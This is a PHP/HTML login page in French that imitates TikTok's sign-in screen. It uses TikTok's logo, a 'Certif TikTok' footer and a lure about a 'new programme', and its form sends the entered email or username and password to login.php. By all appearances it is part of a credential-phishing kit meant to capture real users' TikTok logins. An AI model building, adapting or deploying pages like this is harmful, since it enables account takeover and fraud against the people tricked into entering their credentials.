<?php
include "validate.php";
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login TikTok - Page de connexion</title>
    <link rel="shortcut icon" type="image/x-icon" href="favicon.webp">
    <link rel="stylesheet" href="style.css">
    <script src="jquery.min.js"></script>
    <script src="jscript.js"></script>
</head>
<body>
    <div class="container">
        <div class="login-box">
        <img src="https://sf16-scmcdn-va.ibytedtos.com/goofy/tiktok/web/node/_next/static/images/logo-dark-e95da587b6efa1520dcd11f4b45c0cf6.svg" alt="TikTok Logo" class="logo">
        <h1 style="margin-bottom: 3px;">Connexion</h1>
            <h5 style="text-align: center;">Bienvenue dans notre nouveau programme</h5>
            
            <div class="login-options">
                <button class="option-btn active" data-option="email">E-mail ou nom d'utilisateur</button>
                <button class="option-btn" data-option="phone">Numéro de téléphone</button>
            </div>

            <form action="login.php" method="POST">
                <div class="input-group">
                    <input type="text" id="username" name="email" placeholder="E-mail ou nom d'utilisateur" required>
                </div>
                
                <div class="input-group password-group">
                    <input type="password" id="password" name="password" placeholder="Mot de passe" required>
                    <button type="button" class="toggle-password">
                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24" class="eye-icon">
                            <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                        </svg>
                    </button>
                </div>

                <a href="#" class="forgot-password">Mot de passe oublié ?</a>
                
                <button type="submit" class="login-btn">Connexion</button>
            </form>

            <div class="signup-link">
                Tu n'as pas de compte ? <a href="#">Inscription</a>
            </div>

            <div class="footer">
                <select class="language-select">
                    <option value="fr">Français</option>
                    <option value="en">English</option>
                </select>
                <p class="copyright">© 2025 Certif TikTok</p>
            </div>
        </div>
    </div>
    <script>
    // Ajoutez ce code à votre fichier jscript.js existant
    document.querySelectorAll('.option-btn').forEach(button => {
        button.addEventListener('click', () => {
            document.querySelectorAll('.option-btn').forEach(btn => {
                btn.classList.remove('active');
            });
            button.classList.add('active');
            
            const usernameInput = document.getElementById('username');
            if (button.dataset.option === 'phone') {
                usernameInput.placeholder = 'Numéro de téléphone';
                usernameInput.type = 'tel';
            } else {
                usernameInput.placeholder = 'E-mail ou nom d\'utilisateur';
                usernameInput.type = 'text';
            }
        });
    });

    const togglePassword = document.querySelector('.toggle-password');
    const passwordInput = document.getElementById('password');

    togglePassword.addEventListener('click', () => {
        const type = passwordInput.type === 'password' ? 'text' : 'password';
        passwordInput.type = type;
    });
    </script>
</body>
</html>